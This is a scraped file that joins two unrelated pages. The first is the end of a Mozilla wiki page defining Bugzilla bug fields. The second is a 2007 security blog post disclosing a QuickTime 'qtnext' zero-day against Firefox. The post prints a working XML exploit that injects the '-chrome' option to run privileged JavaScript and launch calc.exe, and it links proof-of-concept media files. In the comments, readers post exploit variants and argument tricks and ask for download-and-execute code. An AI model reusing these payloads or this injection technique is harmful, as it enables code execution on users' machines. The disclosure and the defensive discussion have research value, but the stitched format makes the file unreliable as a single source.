Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from www.gnucitizen.org_44e9f710_20250124_175403.html ===


* [Home](/)
* [Projects](/projects.html)
* [Files](/files)
* [About](/about.html)
# 0DAY QuickTime pwns Firefox

Wed, 12 Sep 2007 12:05:53 GMTby
[pdp](/members/pdp.html)

It seams that QuickTime media formats can cause Firefox to misbehave. The result of this vulnerability can lead to full compromise of the browser.

Before we move on, I have to say a few things. Last year I disclosed two QuickTime vulnerabilities [here](/blog/backdooring-quicktime-movies/) and [here](/blog/backdooring-mp3-files/). The first vulnerability was fixed but the second one was completely ignored. I tried to bring the spot light on the second vulnerability one more time over [here](/blog/myspace-quicktime-worm-follow-up) without much of success. So, I decided to post a demonstration of how a *Low risk* issue can be turned into a very easy to perform **HIGH risk** attack when technology change.

The exploit is rather simple. But first, here is a simple QTL file which instructs the browser to display a friendly `alert('whats up...')` message on the screen:

```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="presentation.mov" autoplay="true" qtnext="javascript:alert('whats up...')"/>
```

The most interesting thing about this simple XML file is that we can save it with QuickTime supported extension in order to mislead the user. If you check about:plugins under Firefox, you will see that QuickTime supports several media formats. We can use the audio and video formats only. This means that you can paste the above code into files with extensions: `3g2, 3gp, 3gp2, 3gpp, AMR, aac, adts, aif, aifc, aiff, amc, au, avi, bwf, caf, cdda, cel, flc, fli, gsm, m15, m1a, m1s, m1v, m2a, m4a, m4b, m4p, m4v, m75, mac, mov, mp2, mp3, mp4, mpa, mpeg, mpg, mpm, mpv, mqv, pct, pic, pict, png, pnt, pntg, qcp, qt, qti, qtif, rgb, rts, rtsp, sdp, sdv, sgi, snd, ulw, vfw, wav` and others.

Enough theory, let's see some action. For more information, just read [this](/blog/backdooring-mp3-files/) blog post. The exploit that gains chrome privileges looks like this:

```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="a.mp3" autoplay="true" qtnext="-chrome javascript:file=Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath('c:\\windows\\system32\\calc.exe');process=Components.classes['@mozilla.org/process/util;1'].createInstance(Components.interfaces.nsIProcess);process.init(file);process.run(true,[],0);void(0);"/>
```

In practice I can do anything with the browser. However, just for the sake of this demonstration, I simply open **calc.exe**.

If you dare to try this in your browser, here is a list of a few files you have to click on. They are not malicious. You have my word: [qt-poc-01.mp3](/files/2007/09/qt-poc-01.mp3), [qt-poc-02-shutdown-dont-click.mp3](/files/2007/09/qt-poc-02-shutdown-dont-click.mp3), [qt-poc-03.mpeg](/files/2007/09/qt-poc-03.mpeg), [qt-poc-04.mov](/files/2007/09/qt-poc-04.mov), [qt-poc-05.avi](/files/2007/09/qt-poc-05.avi).

*BTW, QuickTime comes by default with iTunes. Therefore, iTunes users are most affected, I believe.*

*Archived Comments*

![rezn](//gravatar.com/avatar/5d1658ac36692c8b5ff5612aa9d6a837?s=256&d=retro)reznnice one, pdp.
i am curious - did you ever formally submit this to apple security beyond posting on your blog?![tenest](//gravatar.com/avatar/3fca77349c84a4a4ce1a6bca89cb7707?s=256&d=retro)tenestwow...
/me's jaw drops
i thought for sure that I would be safe since I have never installed quicktime and instead use quicktime alternative (http://www.codecguide.com/download\_qt.htm), but alas, these exploits work even against quicktime alternative....
very nice find...![Gareth Heyes](//gravatar.com/avatar/7f5964ed9f043821b46150632596ed9a?s=256&d=retro)Gareth HeyesMy question is why did you wait so long?
Apple are useless, the only way to get them to do anything is to make it public. They either don't acknowledge vulnerabilities or deny there is even a problem. I suggest changing your wait time to about 1 month.![pagvac](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)pagvacNice one dude. Screw overflows, who needs them when you can do things like this with JS.![Hubert](//gravatar.com/avatar/375c0284a6efd8899f2bc69dbf99d6e3?s=256&d=retro)HubertDoesn't work with Quicktime 6.5 and Firefox 2.0.0.6. The browser window just shows a broken QT icon. Is my QT too old?![Galeazzi](//gravatar.com/avatar/2ce72219509a4a56d20520404f3c1473?s=256&d=retro)Galeazzithis is the stuff we like : )
very good job pdp![Simon Zerafa](//gravatar.com/avatar/722c3bb0d5b36746c6ddaa540cf722fe?s=256&d=retro)Simon ZerafaHi,
Well this is a very good Quicktime exploit however it works in IE7 as well as FF 2.0.0.6
Why so hard on FF? It seems to be a issue with QT not any specific browser.
Kind Regards
Simon![mik](//gravatar.com/avatar/0e92af000cf02969a8106f5b49edc07e?s=256&d=retro)mikFirefox 2.0.0.6 and 3.0 are vulnerable.![Aks aka oknock](//gravatar.com/avatar/54a7af533806935b4e98f4d5a05152b2?s=256&d=retro)Aks aka oknockGood shot pdp. thats really good.![mwood](//gravatar.com/avatar/aa1014ab1416a4d1dbe3300dc746623f?s=256&d=retro)mwoodPOPS IE
```
http://-chrome%20javascript:file=Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath('c://windows//system32//calc.exe');process=Components.classes['@mozilla.org/process/util;1'].createInstance(Components.interfaces.nsIProcess);process.init(file);process.run(true,[],0);void(0);
```
![blah](//gravatar.com/avatar/556f4ac7e166daeedb1b8968e228480b?s=256&d=retro)blahJavascript doesn't work for me using mplayer plugin to handle quicktime.
---
QuickTime Plug-in 6.0 / 7
File name: mplayerplug-in-qt.so
mplayerplug-in 3.31
Video Player Plug-in for QuickTime, RealPlayer and Windows Media Player streams using MPlayer
JavaScript Enabled and Using GTK2 Widgets![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpSimon, yes it is not Firefox specific. It works for IE as well, although the impact is less critical I must say. This is due to the tightened security policies IE implements for local zone scripts.![Tonu Samuel](//gravatar.com/avatar/b1ae202137780b6bd20c9cbef9bb16c5?s=256&d=retro)Tonu SamuelI wonder if Googlebot accesses this "qt-poc-02-shutdown-dont-click.mp3" link does it also shuts google down or bot only? lol :)![31d1](//gravatar.com/avatar/94fda2e8a3794a888f4a9273aadd5d2e?s=256&d=retro)31d1Yeah, googlebot would definitely open that in quicktime while running Firefox.![Jeff](//gravatar.com/avatar/0b6cabe7eed95ed6ba3d41f78afee0e2?s=256&d=retro)JeffNot one of these links actually worked on my XP machine, using Opera. This is not a bug in Quicktime, its shitty browsers. You can't seriously suggest that a media play mechanism should decide which URLs are safe and which are not - that is 100% the problem of the browser.![Giorgio Maone](//gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=256&d=retro)Giorgio MaoneGecko browsers + NoScript are immune, no matter if the attacker site is whitelisted or not.![Xinstict](//gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=256&d=retro)XinstictGreat work! Little note, this to work Firefox must be default browser.![teque](//gravatar.com/avatar/48b864c97466dda7b85a5c3acaaa7543?s=256&d=retro)tequeNice disco pdp,
qt-poc-02-shutdown-dont-click.mp3 link didn't work on my box until i added parameter -s to pass in 2nd to last js statement ... `process.run(true,['-s'],1);void(0);`![jinxpuppy](//gravatar.com/avatar/d61167b4b825aa45bfb196aaa2fb8d84?s=256&d=retro)jinxpuppynice!![JulesLt](//gravatar.com/avatar/39bde984d316d69c707adf8be6649806?s=256&d=retro)JulesLtTested on OS X. By default Quicktime opens the links in Safari, even if this page is opened in Firefox. You need to set default browser to FF also. Having done so, clicking on links presents a cross-site scripting warning from FF, that the script you are running may be trying to trick you. Accepting this gives a file not found from Mozilla - possibly they gave taken something down??
I really wanted to see if the native protection against installed software would kick in, or be bypassed.
That said, it doesn't matter if OS X is protected, given that most Quicktime installs are on Windows XP boxes running iTunes.![Xinstict](//gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=256&d=retro)XinstictIs it possible to run "directly" like `file.initWithPath('c:\\windows\\system32\\cmd.exe /c echo x & run notepad.exe & etc')`? I'm not sure if it can be done but would be much easier to execute code without writing 'firefox backdoors' in 'chrome zone'...![bugstomper](//gravatar.com/avatar/22fc1c7723fac43404decfa835c7797d?s=256&d=retro)bugstomperFirefox 2.0.0.6 under MacOS 10.4.10, the links result in an alert saying You are attempting to login to site mozilla.org with username chrome%20javascript but the site does not require authentication. Ths may be an attempt to trick you. Is that the site you really want to visit? (I'm paraphrasing the alert warning from memory)
Even if I do click Yes on that alert then Firefox tries to open a URL on http://mozilla.org, not a local file or chrome type URL or whatever you are trying to do as an exploit, and all that results is a 404 file not found.
So it appears that Firefox on the Mac is not vulnerable to this after all.![dbacon](//gravatar.com/avatar/9e76e2f4d28c9b303eacdaf670e5b6a9?s=256&d=retro)dbaconIt doesn't work if you have Quicktime alternative installed.![clorox](//gravatar.com/avatar/3953332dce3c112a76e7287d55dce3ab?s=256&d=retro)cloroxnice pdp![Hawkuletz](//gravatar.com/avatar/9b535e633d32e23e2dd327dbeb7b6fe7?s=256&d=retro)HawkuletzDoesn't work on my Mac (Mac OS 10.4.10, Firefox 2.0.0.6 and Quicktime 7.2)
So crossplatform exploits are not yet feasible.![chris](//gravatar.com/avatar/5843f6624044d5717ee07d5e87e5516b?s=256&d=retro)chrisI created a file with you POC code in it, named it test.html and opened it in Windows and it didn't do anything. I put in a real mp3 file named a.mp3 and all it did was play the song yet when I click on your links it works fine. Am I missing something?![Crolwey](//gravatar.com/avatar/089c7154da2ebc6562f35c8a8e48c4eb?s=256&d=retro)CrolweyThe exploits does not work if you have installed the NoScript extension, even if you allow JavaScript for gnucitizen.org.
The exploits do work, of course, if you allow all sites to use JavaScript, i.e. deactivate NoScript.![Bk](//gravatar.com/avatar/0d482a1f7c165c4722f979f89c43303d?s=256&d=retro)Bkinterestingly, when you try these exploits in Firefox on a Macbook Pro, it launches Safari, and pops up Mozilla.org 404 page.
the exploits did not work for me on a XP2 system, even after disabling noscript. but I am using a limited user account, so maybe that makes a diff?![Bk](//gravatar.com/avatar/0d482a1f7c165c4722f979f89c43303d?s=256&d=retro)Bki also tried the exploit in an Windows XP SP2 system using IE7, and it did not work. but again, I was testing using a limited user account, though I don't know if that makes any difference![dave](//gravatar.com/avatar/2a8e46aa4f72a53fbf095557d5eeb4f1?s=256&d=retro)daveWell I've just tried it in a VMWare XP machine, with both firefox, IE7 and Opera clean installs. The exploit started calc.exe on all platforms. Very worrying.![Xinstict](//gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=256&d=retro)XinstictTo exploit this on IE, firefox must be installed too. IE spawns
```
x:\program files\mozilla firefox\firefox.exe -chrome javascript:file=Components.classes...
```
like all other browsers do [K-Meleon,Opera..]![Sp0oKeR](//gravatar.com/avatar/3c5103f613c394651ced1e7b48eaa66b?s=256&d=retro)Sp0oKeRAwsome Job!!!! Actually it's easy to exploit this stuffs =)!!
Regards
Sp0oKeR![eracc](//gravatar.com/avatar/6a5671ad0f4e36c1f0e2a7cf95404dbf?s=256&d=retro)eraccLooks to me like this is a Microsoft Windows only problem (yet again). Firefox 2.0.0.6 with various Quicktime players on Linux does not do anything. Maybe you should try to do something that is Linux specific here. Of course the bottom line is only the truly ignorant (sadly this means many Microsoft Windows users) and morons browse the net as an administrator user.![Chitiga Georges](//gravatar.com/avatar/10248a415c653d66e26294b19e755098?s=256&d=retro)Chitiga GeorgesI`ve tested the exploit and works on firefox and ie6, on ie7 i get a "error on page"![Bk](//gravatar.com/avatar/0d482a1f7c165c4722f979f89c43303d?s=256&d=retro)Bkso short of uninstalling QT, what can users do to protect themselves from this particular sploit?![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpI would recommend to install NoScript if you are a Firefox user and switch to Firefox with NoScript if you use any other browser. When a fix is available, restore your settings.![ntbnnt](//gravatar.com/avatar/14e130d1e371233d0e979319fce65b1f?s=256&d=retro)ntbnnthmmm... doesn't work on my linux or windows boxes... i tried running the tests here with latest stable firefox and quicktime...![0ole](//gravatar.com/avatar/6a6c19fea4a3676970167ce51f39e6ee?s=256&d=retro)0oleSame here **ntbnnt**. Doesn't works on Mac too.![BC](//gravatar.com/avatar/9f1c85478669971b274699c26e6211fe?s=256&d=retro)BCIt works here, it is quite intresting. Notepad Calculator Paint...shell.![Ronald](//gravatar.com/avatar/80d7b8935b953dabd63268177b7981f6?s=256&d=retro)RonaldGood find PDP, very nice research. I was aiming at the same stuff in my new BrowserFry platform, aiming to be an aid in this kind of research.![anon](//gravatar.com/avatar/d26ffa8dde6cc82ccb805e2a20a4978c?s=256&d=retro)anontee hee... all your demo links just open up an "Enter name of file to save to" dialog box for me :-p![random](//gravatar.com/avatar/4adcca49b3b1e5a08ac202f5d5a9e688?s=256&d=retro)randomThis isnt fair to us linux users. I tried to get all of your links to work but they just failed. Mplayer's plugin wouldnt let it through and then apparmor wont allow firefox to execute any applications. Any one have any suggestions? I have firefox...![Nukes](//gravatar.com/avatar/b67018e63cb9ed080909df71816f389e?s=256&d=retro)NukesDid this Exploit works in QuickTime 7.2?
I have tested it here and didn't work :(.
see ya![ntbnnt](//gravatar.com/avatar/14e130d1e371233d0e979319fce65b1f?s=256&d=retro)ntbnntWell, I am getting to a quicktime plugin prompt, the little media bar and of course play does absolutely nothing. very strange, not quite sure what the difference in the boxes that do it and the boxes that don't.... pdp, any ideas about what hardware/additional software would make one more vunerable... I'll keep looking into this...![2rzn](//gravatar.com/avatar/3840755d12928ec3c4b20fc97d781e50?s=256&d=retro)2rznDid not work here. My firefox runs under Xp, and its configured to automatically ask to download files like mp3, mov, avi etc. Its not allowed to automatically launch the player. Seems that that avoids the problem.![Snap](//gravatar.com/avatar/3d77b9db9a47b22398e737207418ab27?s=256&d=retro)Snapit doesnt work here
i have tried in FF and IE with the last version of QuickTime![grigs](//gravatar.com/avatar/5600af6e23670f47d71e95712bc2d390?s=256&d=retro)grigshow is it possible to pass multiple parameters to the cmd? Or does someone know where to reade about the xml file.. how it is structured and what way you can wright to the CMD ?
thanks grigs![hnZ^](//gravatar.com/avatar/3845a2ae838c1652841ea1000b85775f?s=256&d=retro)hnZ^
```
process.run(true,['/parmaeter1'],['/parameter2'],2) (2=arg lenght)
```
and use some utf8 encoder if you have long parameters. I still havent managed to get this to write a .bat.
```
process.run(true,['/c > script.txt echo hello'],1)
```
didn't work as supposed. I also tried the javascript used by pocs for the old firelinking bug (http://www.mikx.de/firelinking/), but I didn't get that to work neither.![Brandon](//gravatar.com/avatar/0885eeac949e9492e901de4fcf06483f?s=256&d=retro)BrandonAll these do are throw an error and then open IE, here, the lot of them. FireFox 2.0.0.6, QuickTime 7.2.![l.phoenix](//gravatar.com/avatar/dcb5ed7d46e58ee7652c00926449033e?s=256&d=retro)l.phoenixI think this vulnerability could be used for install trojan and backdoor. It simplify does this by attach a binary file with javascript code, write it to local file and exec it.
So be aware with every media link you click on FF until Mozilla fixes it on FF 2.0.0.7!![Josh Davis](//gravatar.com/avatar/023978f851b7cfee4379e2b1ac24039a?s=256&d=retro)Josh DavisI really wished that would have worked. Apparently I need quicktime and Windows for this to work? I clicked all the links and my BSD box failed to shutdown or do anything remotely cool. ![ramo](//gravatar.com/avatar/acddaf0d543dd3dcf47a46124d5eda75?s=256&d=retro)ramodoesn't work, although a dll athenticator noted that a new connection locally intiated is attempting to connectto some unknown website.
anywho, doesn't work![wilfred](//gravatar.com/avatar/02d91ef455d3a542e9e4eba5fd12d23f?s=256&d=retro)wilfredno problems @ ubuntu linux :-)![joe](//gravatar.com/avatar/5c4f68132e344371b8ec9545ced719ee?s=256&d=retro)joeyay firefox 2.0.0.7 has been released! I feel safe again :)![AH](//gravatar.com/avatar/41585298147721d7fca0ec83a07b1987?s=256&d=retro)AHHaha, Firefox 2.0.0.7 out that now blocks the -chrome exploit. You never see that kind of turnaround with Microsoft.![Jake Casper](//gravatar.com/avatar/fcb77402dd3b96f2ff68274a8f637575?s=256&d=retro)Jake CasperThis is too many critical alerts in 1 year. I see from the comments here IE isn't affected. Time to make the switch back to what works people.
Jake![chaoskaizer](//gravatar.com/avatar/c5e29912847931f7f8495ef51b7a5521?s=256&d=retro)chaoskaizerthanks for the news, this is one of the most hostile Firefox vulnerabilities.![danieru](//gravatar.com/avatar/c19e58e6cab0ec47a5c4e37086ce796c?s=256&d=retro)danieruwow, incredible finding, pdp!
tested bug on the following:
Mozilla/5.0 (Windows; U; Windows NT 6.0; es-AR; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7 NoScript 1.1.7.2
...did not work, i'm on vista64. it still does recognize the script call tho, but it kinda does not find it lulz. all it says: "cannot find 'allwholecommandline'. please verify the web or local path are correct"![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpdanieru, interesting!!!![Xinstict](//gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=256&d=retro)Xinsticthere is code.exec example since this vuln. is patched now..
This example connects to local ftp with username x and pass x, downloads t.exe and executes it.![Chris](//gravatar.com/avatar/dff3b6d066387a63049874c6a3c71223?s=256&d=retro)ChrisMy 2.0.0.7 crashes opening qt-poc-02-shutdown-dont-click.mp3...![Red](//gravatar.com/avatar/10c7368037d36bcc17a076d8bfc15878?s=256&d=retro)RedLOL danieru!
The firefox 2.0.0.7 that you have installed (im sure it was approx. on the 19th of september) IS issued to close the QT hole!!!!
No matter if it`s vista64 or not!![yksoft1](//gravatar.com/avatar/67c31d8ff56a3f6ebe2bb5d551fceeec?s=256&d=retro)yksoft1Seems Firefox 1.5.0.11 is affected but just pop a messagebox that says IE cannot find URL "Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath('c:\\windows\\system32\\calc.exe');process=Components.classes['@mozilla.org/process/util;1"
and a blank IE Window popped out.![Thor Larholm](//gravatar.com/avatar/4550629aa60f7ef68d07db76ff7244ec?s=256&d=retro)Thor LarholmFirefox 2.0.0.7 takes care of this attack vector, so here are some notes about using qtnext with Internet Explorer:
http://larholm.com/2007/09/19/quicktime-qtnext-0day-for-ie/![SUMGUY](//gravatar.com/avatar/dd194766fdb893d0ff9f1162e19e0015?s=256&d=retro)SUMGUYWhat is the Remote File Download & Execute code for this Exploit..??![NonCents](//gravatar.com/avatar/eec5bcf34ccfa2d2e657c838ebd5ca73?s=256&d=retro)NonCentsThis is a beautiful little hack, and used in conjunction with another - http://www.metacafe.com/watch/705792/windows\_dirty\_trick/ you can absolutely torture anyone... Do this to a friend to make, whatever you want happen whenever they visit... any site (if your truly evil set it to their home page)![Marcello](//gravatar.com/avatar/09c87c395e5df2231b47a989dd19acc5?s=256&d=retro)MarcelloWindows 2000 SP4 (5.00.2195)
Firefox 2.0.0.7
QuickTime player 7.1.6
Clicking on any of the supposed exploit-link I obtain a new Firefox window, and the javascript error console shows something like this:
Error: uncaught exception: [Exception... "Component returned failure code: 0x80004005 (NS\_ERROR\_FAILURE) [nsIStringBundle.GetStringFromName]" nsresult: "0x80004005 (NS\_ERROR\_FAILURE)" location: "JS frame :: chrome://vrs/content/vrsOverlay.js :: :: line 55" data: no]![Andreas](//gravatar.com/avatar/5f302c596238631a8fb4844a94faf7ab?s=256&d=retro)AndreasFirefox 2.0.0.7 has fixed this issue specifically: (excerpt from the problem report at http://www.mozilla.org/security/announce/2007/mfsa2007-28.html)
"On his blog Petko D. Petkov reported that QuickTime Media-Link files contain a qtnext attribute that could be used on Windows systems to launch the default browser with arbitrary command-line options. When the default browser is Firefox 2.0.0.6 or earlier use of the -chrome option allowed a remote attacker to run script commands with the full privileges of the user. This could be used to install malware, steal local data, or otherwise corrupt the victim's computer."
[...]
"To protect Firefox users from this problem we have now eliminated the ability to run arbitrary script from the command-line. Other command-line options remain, however, and QuickTime Media-link files could still be used to annoy users with popup windows and dialogs until this issue is fixed in QuickTime.
This QuickTime issue appears to be the one described by CVE-2006-4965 but the fix Apple applied in QuickTime 7.1.5 does not prevent this version of the problem."![Ano20070922](//gravatar.com/avatar/5c130acf7891e4093f0bebed57603702?s=256&d=retro)Ano20070922Notes to several other comment posters:
1. This exploit only works if Firefox is the default browser. It doesn't matter what browser you use, only the default browser matters for this one.
2. The example exploits on this page use the security hole to launch some programs that are part of Windows. To test the exploits on Mac, Linux, BSD etc. you would need to change those strings in the exploits to name programs from those systems.
3. Firefox 2.0.0.7 removed the command line option used by these exploits.
4. The real issue is that when QuickTime sees a URL inside a movie or song, it passes the url text to the command line of whatever is the default browser in a way which allows passing arbitrary text to the browser command line. In the old Firefox 2.0.0.6 browser this allowed access to the -chrome option. But any browser whose command line parser can be tricked into doing dangerous stuff from nonsense URLs can be exploited.
5. Firefox 2.0.0.7 is just a stopgap workaround for the specific exploits on this page. The real issue is that the generic "open default browser" action in the operating system and class libraries needs to ensure that whatever is passed on to the browser process is a single argument which does not look like an option or contains spaces or shell metacharacters. I don't have the Quicktime source code, so I don't know which interface they use to pass the qtnext string to the browser. But I am certain that the strings found in the exploits should not have made it through the kind of basic security sanitation filters recommended in GNU/UNIX secure programming tutorials for decades.![trustme](//gravatar.com/avatar/ec38bd253cdd60abe4967a3f4653b0d2?s=256&d=retro)trustmeWell. As of Sept 14th Symantec has this included in their AV defs as Bloodhound.Exploit.161
Nice work on the exploit.![je](//gravatar.com/avatar/bab6fb0e03bb6340e4954efecaa5da50?s=256&d=retro)jeThis was fixed with the release of version 2.0.0.7, though.![Oldboy](//gravatar.com/avatar/f5051214d39cf67df9d53676d9b87c9c?s=256&d=retro)OldboyReal through this vulnerability to load exe through the URL?![Francoise MAHENC](//gravatar.com/avatar/0bd4c255fee76b1e723f9c24313cca02?s=256&d=retro)Francoise MAHENCWhat do I do now? One week ago, I got a Trojan, my Word documents were erratic, the Firewall antivirus detected nothing..MS were of no help beyond checking that my softwares were legal. I first got a paid Plus version of my AdAware, which promptly got erratic too, but detected and deleted a MRU. After I had tried to watch a YouTube [professional] video, I had noticed a QT icone come out of nowhere [my son installed iTunes on my laptop, which I never use - and Yes, I browse as an administrator, not knowing any better]. After AdAware, I also switched to Firefox, feeling fed-up with MS generally, and from checking on NoScript, I now got on your QT bug page - it tallies. WHAT DO I DO NOW? I guess this is of no interest to you [except as further proof on Windows users being morons!]but please direct me to people who can answer me: you are the only source of clear information I could get till now. Sorry to bother you, thank you for your activity - and thank you in advance if you can direct me. Francoise Mahenc![Assyren](//gravatar.com/avatar/6d159328d8bd31d33a5b7a6f7e0cddf6?s=256&d=retro)AssyrenI'm using Windows XP sp2 IE but it's not working the song 1.mp3 is runing but the calc.exe is not working i use this code
what should i change so it will work ?
thanx![pissedoff?](//gravatar.com/avatar/a714a516e55159f91fa1f12687349cdb?s=256&d=retro)pissedoff?your beyonce is not malicious?what about this received by AV?:
